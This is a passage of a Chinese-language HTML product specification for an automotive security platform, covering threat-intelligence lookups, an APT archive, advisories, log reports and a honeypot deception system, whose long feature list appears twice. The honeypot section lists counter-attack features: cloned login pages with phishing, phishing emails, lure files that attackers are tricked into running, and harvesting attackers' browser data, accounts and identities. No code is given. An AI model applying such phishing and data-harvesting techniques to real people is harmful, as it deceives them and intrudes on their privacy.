title="IP信誉情报"></a>IP信誉情报</h4><p>系统提供全球汽车和网络安全情报的收集和查询功能。查询文件信誉情报，包括样本哈希值、文件是否恶意、恶意类型和家族信息。同时，支持IP地址查询，包括历史攻击行为、是否为IDC主机、是否为傀儡主机、是否为代理或Tor网主机以及是否可能是扫描机器人。这些功能和数据能够帮助您评估和识别潜在的安全风险和威胁。以下是具体的相关参数：</p><p>功能参数如下：</p><ul><li>本地IP信誉情报数量规模1000万；支持提供IP的地理位置包括归属国家或地区，精确到城市，归属地经纬坐标等；支持提供IP的基础网络属性信息，包括ASN所属组织、是否是代理、是否属于IDC、该IP所述的用户类型</li><li>支持基于IP的情报来源、源IP、IP归属地、源IP端口、威胁类别、协议类型、攻击开始时间等维度进行IP查询，并提供相关的危害等级评估与IP的置信度建议。</li><li>支持联网情况下，本地查询不到的IP信息可到云端查询后返回信息至本地，方便后期查询。</li></ul><h5 id="IP信息详情分析"><a href="#IP信息详情分析" class="headerlink" title="IP信息详情分析"></a>IP信息详情分析</h5><ul><li>IP地址：提供待查询的IP地址</li><li>历史攻击行为：判断该IP地址是否有历史攻击行为的记录，提供与该IP地址相关的攻击事件信息，如攻击类型、目标等IP的情报来源、源IP、IP归属地、源IP端口、威胁类别、协议类型、攻击开始时间等维度进行IP查询。</li><li>是否为IDC主机：判断该IP地址是否为IDC（互联网数据中心）主机</li><li>是否为傀儡主机：判断该IP地址是否为傀儡主机，即被黑客控制的主机</li><li>是否为代理或Tor网主机：判断该IP地址是否为代理服务器或Tor网络主机，提供与该IP地址相关的代理和Tor网络信息</li><li>是否可能是扫描机器人：判断该IP地址是否可能是用于扫描网络的机器人，提供与该IP地址相关的扫描行为信息，如扫描频率、扫描目标等。</li></ul><h5 id="IP归属地和IP信誉评分-1"><a href="#IP归属地和IP信誉评分-1" class="headerlink" title="IP归属地和IP信誉评分"></a>IP归属地和IP信誉评分</h5><p>IP信誉情报数量规模有1300万，通过外部接口获取IP属地等地理位置详细信息，并通过对IP的分析确定对IP的信誉评级，提升对IP的分析能力。</p><h5 id="IP信誉情报更新"><a href="#IP信誉情报更新" class="headerlink" title="IP信誉情报更新"></a>IP信誉情报更新</h5><ul><li>支持多种更新机制，包括在线和离线更新机制，支持即时更新，在线更新方式会同步到定时任务，获取到更新提示，自动更新，离线更新支持按天数更新，及时更新离线更新包。</li></ul><h4 id="漏洞情报-1"><a href="#漏洞情报-1" class="headerlink" title="漏洞情报"></a>漏洞情报</h4><p>提供漏洞情报查询功能，包括时间范围限制、漏洞名称、风险等级等维度的查询。可以根据指定的条件进行漏洞情报查询，获取与查询条件相匹配的漏洞情报数据。可以限定查询的时间范围，根据漏洞名称进行查询，或者按照漏洞的风险等级进行查询。这些功能能够帮助获取与漏洞相关的情报数据，以评估和应对安全风险。</p><p>功能参数如下：</p><ul><li>本地漏洞情报数量规模10万余条；支持提供漏洞基础信息：包括内部编号、漏洞类型、漏洞名称、风险等级、CVE相关信息、时间范围等。</li><li>支持漏洞户口：包括漏洞描述、漏洞利用条件、漏洞影响版本、漏洞影响面、漏洞检测方式、漏洞缓解措施、相关参考链接等信息；支持漏洞定性定级：包括漏洞利用方式是否需要交互、是否需要进行认证、漏洞利用条件、漏洞触发方式、漏洞直接后果、漏洞影响范围。</li></ul><h5 id="情报管理和接入"><a href="#情报管理和接入" class="headerlink" title="情报管理和接入"></a>情报管理和接入</h5><ul><li>本地漏洞情报数量规模10万条，本产品系统提供丰富的漏洞情报资源，以满足用户的需求。</li><li>支持漏洞详情页面，包括漏洞描述、漏洞利用条件、漏洞影响版本、漏洞影响面、漏洞检测方式、漏洞缓解措施、相关参考链接等详细信息。用户可以深入了解每个漏洞的具体情况和应对措施。</li></ul><h5 id="漏洞情报查询"><a href="#漏洞情报查询" class="headerlink" title="漏洞情报查询"></a>漏洞情报查询</h5><ul><li>时间范围：提供漏洞情报查询的时间范围限制</li><li>漏洞名称： 根据漏洞名称进行查询，提供与指定漏洞相关的情报数据，如漏洞名称、CVE编号、风险等级等，以快速定位和获取所需的漏洞情报。</li><li>风险等级：根据漏洞的风险等级进行查询，提供不同风险等级漏洞的情报数据</li><li>漏洞情报查询：基于指定的条件进行漏洞情报查询，可以根据时间范围、漏洞名称、风险等级等维度进行查询，提供与查询条件相匹配的漏洞情报数据</li></ul><h5 id="漏洞情报实时更新-1"><a href="#漏洞情报实时更新-1" class="headerlink" title="漏洞情报实时更新"></a>漏洞情报实时更新</h5><ul><li>支持多种更新机制，包括在线和离线更新机制，支持即时更新，在线更新方式会同步到定时任务，获取到更新提示，自动更新，离线更新支持按天数更新，及时更新离线更新包。</li><li>漏洞统计分析：是一个强大的工具，能够汇总、分析和管理大规模的漏洞情报。它提供了漏洞的基础信息，包括内部编号、类型、名称、风险等级、CVE相关信息和时间范围，同时也提供了漏洞户口，其中包括详细的漏洞描述、利用条件、影响版本、检测方式、缓解措施以及相关参考链接。这个模块还支持漏洞的定性定级，涵盖了漏洞利用方式、认证需求、触发方式、直接后果和影响范围等方面的信息。通过这个功能，用户能够全面了解漏洞的性质和潜在风险，以便有针对性地采取必要的安全措施来降低可能的威胁。</li></ul><h4 id="APT档案库-1"><a href="#APT档案库-1" class="headerlink" title="APT档案库"></a>APT档案库</h4><p>支持对APT团体情报库进行管理和风险发现。以下是相关技术参数。</p><p>功能参数如下：</p><ul><li>支持显示APT组织团伙相关联数据，相关联数据包括： 团伙简介、团伙概述、技战法、APT情报、历史报告和数据可视化呈现；支持显示APT团伙的常用的基础设施，包括：C2、样本HASH、IP、Domain、URL等。</li><li>支持显示APT团伙技战法归纳，显示相应团伙常用的攻击手法等信息。</li><li>支持通过拓线图谱的方式展示APT的所关联的相关联信息，关系图谱至少应包括：Domain、ip、URL、HASH、Report、Attacker、Malware。</li><li>支持查看APT团伙近期以及历史所有相关报告并支持下载报告。</li><li>支持通过标准Restful-API提供APT档案库接口服务。</li></ul><h5 id="APT情报管理"><a href="#APT情报管理" class="headerlink" title="APT情报管理"></a>APT情报管理</h5><ul><li>全球地图可视化：以全球地图的形式展示活跃的APT组织和团伙的分布情况，提供地理位置、攻击目标等相关信息的可视化展示。</li><li>活跃APT组织和团伙数据：提供关于活跃APT组织和团伙的详细数据，包括组织名称、组织结构、攻击手段、攻击目标等信息，持显示APT团伙的常用的基础设施。</li><li>团伙简介：提供APT团伙的简要介绍和背景信息，包括团伙的历史、组织结构、攻击特征等信息。</li><li>团伙概述：提供APT团伙的概述信息，包括其攻击目标、攻击手段等。</li><li>技战法：提供APT团伙使用的技术和战术信息，包括攻击工具、攻击方法、漏洞利用等信息。</li><li>APT情报：提供与APT团伙相关的情报信息，包括最新的攻击活动、恶意软件样本等。</li><li>历史报告：提供过去关于APT团伙的报告和分析结果，包括攻击事件的溯源、攻击手段的分析等。</li><li>关系图谱数据：提供APT团伙之间的关系图谱数据，展示其组织结构和关联关系，包括团伙成员、指挥链、合作关系等信息。系图谱包括：Domain、ip、URL、HASH、Report、Attacker、Malware。</li><li>支持查看APT团伙近期以及历史所有相关报告并支持下载报告。</li><li>支持通过标准Restful-API提供APT档案库接口服务。</li></ul><h4 id="安全通告"><a href="#安全通告" class="headerlink" title="安全通告"></a>安全通告</h4><p>监测和分析车联网系统中的安全事件和威胁情报；及时生成安全通告，向相关的车联网参与者和利益相关方提供警示和建议；包括漏洞公告、安全更新、最佳实践等信息；提供安全通告的定期更新和实时推送，确保信息的及时性和准确性；支持与车联网系统的安全管理平台集成，实现自动化的安全通告生成和分发；促进车联网参与者的安全意识和行为，提高整体的车联网系统安全性。</p><p>功能参数如下：</p><ul><li>云端发布的事件通报支持通过多种升级方式同步到用户本地平台，通报内容包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息，支持安全通告通过PDF方式进行导出。</li><li>支持报告搜索功能，支持同步到本地的通报可以在本地存储并通过特定条件查询。查询条件包括通告类型、影响行业、攻击者类型、报告渠道、报告搜索等，并允许根据时间范围进行查询；安全通告支持Restful API接口与第三方接口继承，返回结果需包括发布时间、发布厂商、通告类型、影响地域、影响行业、威胁等级、攻击者组织、攻击者类型、通告详情等。</li></ul><h5 id="云端事件通报"><a href="#云端事件通报" class="headerlink" title="云端事件通报"></a>云端事件通报</h5><p>系统支持云端发布的事件通报同步到用户本地平台，以便用户能够及时获取最新的安全通告。</p><p>通报内容包括发布时间、发布厂商、报告名称、通告类型、影响区域、威胁等级、影响行业、攻击者类型、攻击者组织、参考链接、标签等信息。这些信息提供了事件通报的详细描述和相关参考资料。</p><p>安全通告支持通过PDF方式进行导出，用户可以将通告保存为PDF文件，以便离线查阅和分享。</p><h5 id="报告搜索功能"><a href="#报告搜索功能" class="headerlink" title="报告搜索功能"></a>报告搜索功能</h5><p>系统支持对同步到本地的通报进行搜索，用户可以根据特定条件查询所需的通报信息。</p><p>查询条件至少包括通告类型、影响行业、攻击者类型、报告渠道、报告搜索等。用户可以根据这些条件进行灵活的查询，以获取符合特定需求的通报信息。</p><p>用户还可以根据时间范围进行查询，以限定通报的发布时间范围。</p><h5 id="安全通告的同步和接口集成"><a href="#安全通告的同步和接口集成" class="headerlink" title="安全通告的同步和接口集成"></a>安全通告的同步和接口集成</h5><p>系统支持安全通告通过Restful API接口与第三方接口进行集成，以便其他系统或平台能够获取安全通告的相关信息。</p><p>返回结果包括发布时间、发布厂商、通告类型、影响地域、影响行业、威胁等级、攻击者组织、攻击者类型、通告详情等。这些信息可以帮助第三方系统进行安全事件的分析和响应。</p><h5 id="监测和分析"><a href="#监测和分析" class="headerlink" title="监测和分析"></a>监测和分析</h5><p>使用监测技术和分析方法对车联网系统进行持续监测和分析，以便发现安全事件和威胁情报。</p><h5 id="定期更新和实时推送"><a href="#定期更新和实时推送" class="headerlink" title="定期更新和实时推送"></a>定期更新和实时推送</h5><p>提供安全通告的定期更新和实时推送，确保信息的及时性和准确性，使得车联网参与者能够及时了解最新的安全情况。</p><h5 id="智能数据备份与恢复模块"><a href="#智能数据备份与恢复模块" class="headerlink" title="智能数据备份与恢复模块"></a>智能数据备份与恢复模块</h5><p>智能数据备份与恢复模块是一个全面的数据管理解决方案，它提供了智能化的备份策略和可靠的恢复功能。用户可以轻松创建备份计划，选择增量或全量备份，同时确保备份数据的安全性，通过加密和灵活的存储选项，保护数据免受未经授权的访问。不仅如此，该模块还提供了智能的恢复选项，包括选择性恢复和历史记录的管理，方便用户根据需要恢复特定时间点的数据。通过监测备份状态并提供异常通知，它能及时发现备份过程中的问题，确保备份系统的健康运行。简单易用的界面和自动化管理功能进一步增强了用户体验，为数据的安全备份和高效恢复提供了可靠保障。</p><h4 id="日志报表"><a href="#日志报表" class="headerlink" title="日志报表"></a>日志报表</h4><p>收集和存储车联网系统的安全事件和活动日志；对日志数据进行分析和处理，提取有用的信息；生成详细的日志报表，包括安全事件统计、攻击趋势、异常行为等内容；支持可视化展示，以图表、图形等形式呈现报表数据；提供灵活的查询和筛选功能，方便用户按需获取特定的日志信息；支持定制化报表生成，满足用户的特定需求；提供报表导出和共享功能，方便与团队成员或相关方共享报表数据；支持报表的定期自动化生成和更新，确保及时获取最新的安全日志信息。</p><p>功能参数如下：</p><ul><li>支持运营分析数据可视化分析，实现对失陷检测、恶意家族 TOP7(近7天)、文件信誉—命中类型统计TOP7（近7天）、IOC威胁等级（近7天）等数据的实时监控。</li><li>支持详细统计和呈现API-key查询TOP10、查询源TOP10、查询情报TOP10、命中情报TOP10、未命中情报TOP10的使用排行数据。</li><li>支持提供系统操作指令的审计日志，针对当前设备策略进行配置变更、情报下发、文件下载等操作时，对每个用户的行为做审计。</li></ul><h5 id="日志收集与分析"><a href="#日志收集与分析" class="headerlink" title="日志收集与分析"></a>日志收集与分析</h5><ul><li>收集和存储：使用合适的技术手段收集和存储车联网系统的安全事件和活动日志，确保数据的完整性和可靠性。</li><li>分析和处理：对收集到的日志数据进行分析和处理，采用适当的算法和方法提取有用的信息，以便发现潜在的安全威胁和异常行为。系统支持将运营数据进行可视化分析，以便用户能够直观地了解系统的运行情况和安全态势。</li><li>支持实时监控：监控失陷检测、恶意家族 TOP7（近7天）、文件信誉命中类型统计 TOP7（近7天）、IOC 威胁等级（近7天）等数据。这些数据的实时监控可以帮助用户及时发现异常和威胁情况。</li></ul><h5 id="日志管理和查询"><a href="#日志管理和查询" class="headerlink" title="日志管理和查询"></a>日志管理和查询</h5><ul><li>日志详细统计和呈现API-key查询TOP10、查询源TOP10、查询情报TOP10、命中情报TOP10、未命中情报TOP10的使用排行数据。</li><li>生成详细报表：根据分析结果生成详细的日志报表，包括安全事件统计、攻击趋势、异常行为等内容，以便用户全面了解车联网系统的安全状况。</li><li>可视化展示：利用图表、图形等形式将报表数据进行可视化展示，使得用户能够直观地理解和分析安全日志信息。</li><li>查询和筛选功能：提供灵活的查询和筛选功能，方便用户按需获取特定的日志信息，以满足其具体的安全分析需求。</li><li>定制化报表生成：支持用户根据特定需求定制化报表生成，以便满足个性化的安全分析和报告</li><li>系统支持记录系统操作指令的审计日志，以便对用户的行为进行审计和追踪。</li></ul><h4 id="攻击诱捕技术"><a href="#攻击诱捕技术" class="headerlink" title="攻击诱捕技术"></a>攻击诱捕技术</h4><p>蜜罐是一种专门设计的虚假系统、应用程序或网络服务，旨在吸引攻击者并监测他们的活动。它被放置在网络中的关键位置，以模拟真实系统的存在和脆弱性，诱使攻击者将其视为攻击目标。</p><p>蜜罐可以分为两种类型：高交互蜜罐和低交互蜜罐。高交互蜜罐是完整的虚拟环境，模拟真实系统的各个方面，包括操作系统、应用程序和服务。攻击者与高交互蜜罐进行交互时，其活动将被详细记录和监测，以获取攻击者的技术手段和意图。</p><p>低交互蜜罐则更为简化，通常是单个应用程序或服务的模拟。它们提供有限的功能，以减少攻击者与蜜罐的交互，但仍能收集攻击者的行为信息。</p><p>蜜罐的部署需要考虑多个因素，包括选择合适的操作系统和应用程序版本、配置虚拟网络环境、设置合理的日志记录和警报机制等。它们还需要与其他安全设备和系统集成，以及与安全团队进行协调和响应。</p><p>通过蜜罐，安全团队可以收集攻击者的策略、工具和漏洞利用技术，了解攻击趋势和威胁情报，从而改进防御措施、修补漏洞并提高整体网络安全性。然而，蜜罐也需要谨慎部署和维护，以确保其安全性和不对真实系统造成风险。</p><p>本方案根据场景需求部署一套成熟的攻击诱捕技术的系统，针对于攻击可以更快响应，发现为止威胁，对威胁进行溯源。以下是本系统的相关技术功能。</p><p>该蜜罐系统具备6个高交互蜜罐，支持展示攻击路径、告警分布和趋势、日志类型和来源趋势，提供大屏展示综合态势，可进行告警筛选和过滤，统计威胁级别和反制类型，查看告警详情并进行加白操作，同时支持告警和反制告警的导出，以全面了解系统安全情况、监控攻击行为并进行分析和报告。</p><p>蜜罐系统部署：模拟和部署吸引力高的蜜罐系统，吸引潜在攻击者进行攻击。</p><p>蜜罐配置：蜜罐应该模拟真实系统或服务的特征，包括操作系统、服务端口、软件版本等。配置蜜罐时需要考虑安全性，确保蜜罐不会成为攻击者的跳板或攻击源，可同时运行10个蜜罐系统，具有蜜罐系统的所有功能要求。</p><p>攻击监测与记录：实时监测和记录攻击者与蜜罐系统之间的交互行为，包括攻击尝试、漏洞利用等。</p><p>攻击流量分析：对攻击流量进行深度分析和解析，以获取攻击者的行为特征和攻击手段。</p><p>攻击报告生成：生成详细的攻击报告，包括攻击类型、攻击目标、攻击来源等信息，帮助用户全面了解攻击事件的发生和特征。</p><p>实时警报与通知：提供实时警报和通知机制，及时通知安全团队有关攻击事件的发生，以便快速响应和采取相应的安全措施。</p><p>溯源与行为分析：支持对攻击流量进行溯源和行为分析，帮助用户更好地了解攻击者的动机、手法和行为模式。</p><p>交互式可视化界面：提供直观的交互式可视化界面，以图表、图形等形式展示攻击活动和趋势，帮助用户快速理解和分析攻击事件。</p><p>安全工具集成：支持与其他安全工具和系统的集成，实现威胁情报共享和联动防御，提升整体安全防护能力。</p><p>安全性和隔离：蜜罐系统应该具备高度的安全性和隔离性，以防止攻击者利用蜜罐入侵真实系统。蜜罐应该与真实系统隔离，并采取必要的安全措施，如访问控制、防火墙规则、网络监控等。</p><p>该系统技术特点：</p><ul><li>支持同时运行6个高交互蜜罐</li><li>支持按照攻击者行为链条的形式展示攻击路径</li><li>支持按照环形图查看各级别的告警分布，以及告警数量TOP10的攻击ip</li><li>支持按照线形图查看各级别的告警趋势</li><li>支持按照环形图查看各类型的日志，以及日志数量TOP10的受害ip</li><li>支持按照线形图查看各类型的日志来源趋势</li><li>支持大屏展示，按时间查看综合态势，包含全局风险值、告警、引流规则、系统流量、蜜罐关系网等数据</li><li>支持按照攻击IP、受害IP、蜜罐名称、攻击者归属地、威胁名称、威胁级别、攻击结果、引流规则、时间筛选告警</li><li>支持过滤攻击IP、筛选告警</li><li>支持按照危急、高危、中危、低危的威胁级别统计告警，支持通过环形图展示威胁级别分布、支持通过线形图展示威胁级别告警</li><li>支持查看告警详情，包含基本信息、攻击者信息、关联告警等内容</li><li>支持直接进行告警加白操作</li><li>支持导出csv格式和pcap格式的告警详情</li><li>支持按照攻击IP、受害IP、蜜罐名称、办公地点、威胁名称、威胁级别、攻击结果、引流规则、时间筛选告警</li><li>支持按照危急、高危、中危、低危的威胁级别统计告警，支持通过环形图展示威胁级别分布、支持通过线形图展示威胁级别告警</li><li>支持查看告警详情，包含基本信息、攻击者信息、关联告警等内容</li><li>支持直接进行告警加白操作</li><li>支持导出csv格式和pcap格式的告警详情</li><li>支持按照攻击IP、受害IP、反制类型、攻击者归属地、攻击者信息、时间筛选告警</li><li>支持按照浏览器指纹、社交信息、反制文件、诱饵文件的反制类型统计告警，支持通过环形图展示反制类型分布、支持通过线形图展示反制类型告警</li><li>支持查看溯源反制告警详情</li><li>支持导出csv格式的告警详情</li><li>支持按蜜罐名称、模板类型、模板名称、监听IP、监听服务、蜜罐状态、交互类型筛选蜜罐</li><li>支持对蜜罐进行启用、停止、暂停、重启、编辑、删除操作</li><li>支持实时监控蜜罐运行状态</li><li>支持内置常见漏洞的靶场，包含weblogic、Struts2、tomcat、thinkphp、springboot等</li><li>支持蜜罐代理功能，在将攻击者引入高交互蜜罐之前，蜜罐代理根据协议类型、服务类型、攻击类型进行预处理</li><li>支持内置蜜罐模板，数量100个；</li><li>支持登录反制蜜罐，用于定制真实网站的登录界面仿真，与真实网站的登录界面一致，并含有反制与钓鱼功能</li><li>支持在指定的实例上配置反制功能，通过反制功能获取攻击者的浏览器隐私数据、主机账号、主机IP及端口开放情况、个人应用账号、身份ID等信息</li><li>支持添加监听IP数量不受限</li><li>KVM支持内核级安全加固，防止虚拟机逃逸</li><li>支持通过模版的方式导入蜜罐模版</li><li>支持常见网络设备或服务如：proftpd, stupid-ftpd,tomcat，firewall，apache,nginx,iis,dovecot,samba,ibm,windows,default,rustock,exim,ubuntu,centos,comware,debian,freebsd,huawei等</li><li>支持常见协议服务如http、redis、rdp、ssh、telnet、elasticsearch等6种服务仿真</li><li>支持Linux、windows操作系统仿真</li><li>支持qcow2类型的蜜罐模版文件</li><li>支持通过自定义指纹添加模板</li><li>支持展示内置模板和自定义模板的交互类型</li><li>支持对自定义模板进行编辑和删除</li><li>支持新建指纹：参数配置和资源包导入</li><li>支持在模板管理中将多个自定义指纹组成模板</li><li>支持部署感知节点，通过感知节点接收诱饵相关的回连信息</li><li>支持通过下载安装包或复制安装脚本的方式部署诱饵节点，支持在windows和Linux的操作系统上部署，通过诱饵节点收集诱饵相关数据</li><li>支持自定义诱饵文件</li><li>支持添加主机诱饵，利用主机发布的虚假用户信息迷惑攻击者，包括Xshell连接诱饵、SSH历史命令诱饵、账号信息诱饵、远程桌面诱饵、hostname映射诱饵</li><li>支持添加邮件诱饵，给指定用户发送钓鱼邮件，系统内置默认模板</li><li>支持添加反制诱饵，感知并获取用户信息</li><li>支持通过文件下载欺骗的方式进行反制，可以通过系统构造具备下载功能的页面，诱骗攻击者点击运行</li><li>支持添加互联网诱饵，在GitHub、gitee、gitlab上发布诱饵信息引诱攻击者攻击</li><li>支持通过SDN的方式进行攻击力量的牵引，支持对SDN交换机的链路和接口进行管理、支持引流策略的管理</li><li>SDN模式下支持引流的白名单，包括对源IP、目的IP、域名的过滤。</li><li>SDN模式支持自动引流规则和手动引流规则，自动引流规则下支持和天眼流量传感器设备进行联动，将指定告警类型告警流量引入到蜜罐系统中。手动引流规则可以配置需要引流的源IP和目的IP</li><li>支持通过代理模式进行流量牵引，无需外置硬件探针</li><li>支持根据全流量威胁检测系统传感器的告警日志，对自动引流规则进行流量过滤，设置引流白名单</li><li>支持按照攻击IP、受害IP、威胁名称、威胁等级、告警名称等信息筛选告警</li><li>支持快速报表并提供报表模版，可自定义选择报表生成的时间范围、报表格式、报表模版</li><li>支持自定义进行运营配置：支持导航LOGO、系统LOGO、企业LOGO、系统名称、浏览器页签、版权信息的配置</li><li>支持进行在线、离线升级，支持查看升级日志和导出日志</li><li>支持和全流量威胁分析平台的联动，支持AES256、SM4数据传输加密，确保数据传输的安全性</li><li>支持通过SYSLOG向第三方平台发送告警日志和设备状态日志</li><li>支持通过SNMP向第三方平台发送设备状态日志</li><li>支持通过API调用接口、获取数据</li><li>展示系统的运行状态，包括CPU利用率、内存利用率、存储空间使用率、网络流量，日志外发情况的展示</li><li>支持通过页面对设备进行设备关机、设备重启、恢复出厂、服务自检等操作</li><li>支持配置不同角色的账号，包括系统管理员、操作员、审计员三种角色</li><li>支持查看审计日志，查看用户在平台的操作详情，支持导出</li><li>支持通过JSONP获取10余种JSONP溯源网站攻击者社交信息</li><li>支持设置告警白名单，触发白名单则不会产生告警。支持对名单进行增删改查，支持根据名单细节筛选</li><li>支持设置蜜罐黑名单，触发黑名单则不会访问到蜜罐。支持对名单进行增删改查，支持根据名单细节筛选</li><li>支持设置登录黑白名单，触发黑名单则不会访问和管理到蜜罐设备；触发白名单则仅白名单内用户可访问和管理到蜜罐设备。支持对名单进行增删改查，支持根据名单细节筛选</li></ul><p>功能参数如下：</p><ul><li>支持同时运行6个高交互蜜罐</li><li>支持按照攻击者行为链条的形式展示攻击路径</li><li>支持按照环形图查看各级别的告警分布，以及告警数量TOP10的攻击ip</li><li>支持按照线形图查看各级别的告警趋势</li><li>支持按照环形图查看各类型的日志，以及日志数量TOP10的受害ip</li><li>支持按照线形图查看各类型的日志来源趋势</li><li>支持大屏展示，按时间查看综合态势，包含全局风险值、告警、引流规则、系统流量、蜜罐关系网等数据</li><li>支持按照攻击IP、受害IP、蜜罐名称、攻击者归属地、威胁名称、威胁级别、攻击结果、引流规则、时间筛选告警</li><li>支持过滤攻击IP、筛选告警</li><li>支持按照危急、高危、中危、低危的威胁级别统计告警，支持通过环形图展示威胁级别分布、支持通过线形图展示威胁级别告警</li><li>支持查看告警详情，包含基本信息、攻击者信息、关联告警等内容</li><li>支持直接进行告警加白操作</li><li>支持导出csv格式和pcap格式的告警详情</li><li>支持按照攻击IP、受害IP、蜜罐名称、办公地点、威胁名称、威胁级别、攻击结果、引流规则、时间筛选告警</li><li>支持按照危急、高危、中危、低危的威胁级别统计告警，支持通过环形图展示威胁级别分布、支持通过线形图展示威胁级别告警</li><li>支持查看告警详情，包含基本信息、攻击者信息、关联告警等内容</li><li>支持直接进行告警加白操作</li><li>支持导出csv格式和pcap格式的告警详情</li><li>支持按照攻击IP、受害IP、反制类型、攻击者归属地、攻击者信息、时间筛选告警</li><li>支持按照浏览器指纹、社交信息、反制文件、诱饵文件的反制类型统计告警，支持通过环形图展示反制类型分布、支持通过线形图展示反制类型告警</li><li>支持查看溯源反制告警详情</li><li>支持导出csv格式的告警详情</li><li>支持按蜜罐名称、模板类型、模板名称、监听IP、监听服务、蜜罐状态、交互类型筛选蜜罐</li><li>支持对蜜罐进行启用、停止、暂停、重启、编辑、删除操作</li><li>支持实时监控蜜罐运行状态</li><li>支持内置常见漏洞的靶场，包含weblogic、Struts2、tomcat、thinkphp、springboot等</li><li>支持蜜罐代理功能，在将攻击者引入高交互蜜罐之前，蜜罐代理根据协议类型、服务类型、攻击类型进行预处理</li><li>支持内置蜜罐模板，数量100个</li><li>支持登录反制蜜罐，用于定制真实网站的登录界面仿真，与真实网站的登录界面一致，并含有反制与钓鱼功能</li><li>支持在指定的实例上配置反制功能，通过反制功能获取攻击者的浏览器隐私数据、主机账号、主机IP及端口开放情况、个人应用账号、身份ID等信息</li><li>支持添加监听IP数量不受限</li><li>KVM支持内核级安全加固，防止虚拟机逃逸</li><li>支持通过模版的方式导入蜜罐模版</li><li>支持常见网络设备或服务如：proftpd, stupid-ftpd,tomcat，firewall，apache,nginx,iis,dovecot,samba,ibm,windows,default,rustock,exim,ubuntu,centos,comware,debian,freebsd,huawei等</li><li>支持常见协议服务如http、redis、rdp、ssh、telnet、elasticsearch等6种服务仿真</li><li>支持Linux、windows操作系统仿真</li><li>支持qcow2类型的蜜罐模版文件</li><li>支持通过自定义指纹添加模板</li><li>支持展示内置模板和自定义模板的交互类型</li><li>支持对自定义模板进行编辑和删除</li><li>支持新建指纹：参数配置和资源包导入</li><li>支持在模板管理中将多个自定义指纹组成模板</li><li>支持部署感知节点，通过感知节点接收诱饵相关的回连信息</li><li>支持通过下载安装包或复制安装脚本的方式部署诱饵节点，支持在windows和Linux的操作系统上部署，通过诱饵节点收集诱饵相关数据</li><li>支持自定义诱饵文件</li><li>支持添加主机诱饵，利用主机发布的虚假用户信息迷惑攻击者，包括Xshell连接诱饵、SSH历史命令诱饵、账号信息诱饵、远程桌面诱饵、hostname映射诱饵</li><li>支持添加邮件诱饵，给指定用户发送钓鱼邮件，系统内置默认模板</li><li>支持添加反制诱饵，感知并获取用户信息</li><li>支持通过文件下载欺骗的方式进行反制，可以通过系统构造具备下载功能的页面，诱骗攻击者点击运行</li><li>支持添加互联网诱饵，在GitHub、gitee、gitlab上发布诱饵信息引诱攻击者攻击</li><li>支持通过SDN的方式进行攻击力量的牵引，支持对SDN交换机的链路和接口进行管理、支持引流策略的管理</li><li>SDN模式下支持引流的白名单，包括对源IP、目的IP、域名的过滤。</li><li>SDN模式支持自动引流规则和手动引流规则，自动引流规则下支持和天眼流量传感器设备进行联动，将指定告警类型告警流量引入到蜜罐系统中。手动引流规则可以配置需要引流的源IP和目的IP</li><li>支持通过代理模式进行流量牵引，无需外置硬件探针</li><li>支持根据全流量威胁检测系统传感器的告警日志，对自动引流规则进行流量过滤，设置引流白名单</li><li>支持按照攻击IP、受害IP、威胁名称、威胁等级、告警名称等信息筛选告警</li><li>支持快速报表并提供报表模版，可自定义选择报表生成的时间范围、报表格式、报表模版</li><li>支持自定义进行运营配置：支持导航LOGO、系统LOGO、企业LOGO、系统名称、浏览器页签、版权信息的配置</li><li>支持进行在线、离线升级，支持查看升级日志和导出日志</li><li>支持和全流量威胁分析平台的联动，支持AES256、SM4数据传输加密，确保数据传输的安全性</li><li>支持通过SYSLOG向第三方平台发送告警日志和设备状态日志</li><li>支持通过SNMP向第三方平台发送设备状态日志</li><li>支持通过API调用接口、获取数据</li><li>展示系统的运行状态，包括CPU利用率、内存利用率、存储空间使用率、网络流量，日志外发情况的展示</li><li>支持通过页面对设备进行设备关机、设备重启、恢复出厂、服务自检等操作</li><li>支持配置不同角色的账号，包括系统管理员、操作员、审计员三种角色</li><li>支持查看审计日志，查看用户在平台的操作详情，支持导出</li><li>支持通过JSONP获取10余种JSONP溯源网站攻击者社交信息</li><li>支持设置告警白名单，触发白名单则不会产生告警。支持对名单进行增删改查，支持根据名单细节筛选</li><li>支持设置蜜罐黑名单，触发黑名单则不会访问到蜜罐。支持对名单进行增删改查，支持根据名单细节筛选</li><li>支持设置登录黑白名单，触发黑名单则不会访问和管理到蜜罐设备；触发白名单则仅白名单内用户可访问和管理到蜜罐设备。支持对名单进行增删改查，支持根据名单细节筛选</li></ul><h2 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h2><p>功能参数如下：</p><ul><li>支持在互联网连接情况下，情报满足小时级更新升级</li><li>离线情况下支持升级包导入升级，情报准天级更新升级</li></ul><h3 id="数据在线和离线更新"><a href="#数据在线和离线更新" class="headerlink" title="数据在线和离线更新"></a>数据在线和离线更新</h3><p>提供多种更新方式，包括在线和离线更新方式。灵活满足不同需求，根据实际情况选择最适合的更新方式，确保系统始终具备最新的威胁情报，以适应不断演化的威胁环境。</p><p>在互联网连接情况下，情报以小时为单位进行更新升级</p><p>在离线情况下以升级包导入方式升级，情报准天级更新升级</p><h1 id="智能汽车网络靶场检测平台"><a href="#智能汽车网络靶场检测平台" class="headerlink" title="智能汽车网络靶场检测平台"></a>智能汽车网络靶场检测平台</h1><h2 id="系统概述-1"><a href="#系统概述-1" class="headerlink" title="系统概述"></a>系统概述</h2><p>安全检测平台的资产数据和漏洞数据与漏洞管理平台和安全运营平台进行同步，安全运营平台对资产的整体安全状态进行展示，漏洞管理平台的数据同步给安全检测平台进行测试验证。</p><p>安全检测平台提供一站式的测试管理，实现自动化测试与人工测试，以及管理工作都可以在平台操作完成。并且具有综合的业务管理，提供了测试数据的展示功能，也可对测试的目标，计划，需求，用例，任务，缺陷，报告，权限等管理。平台支持多业务，例如支持常规的功能测试，支持安全合规检测等；也支持多任务执行，可同时进行多种不同的测试任务。平台具有丰富的API接口支持，例如支持对外提供测试数据，支持三方系统接入，支持工具接入与管理，支持对硬件工具的接入配置进行管理。</p><h2 id="技术架构描述"><a href="#技术架构描述" class="headerlink" 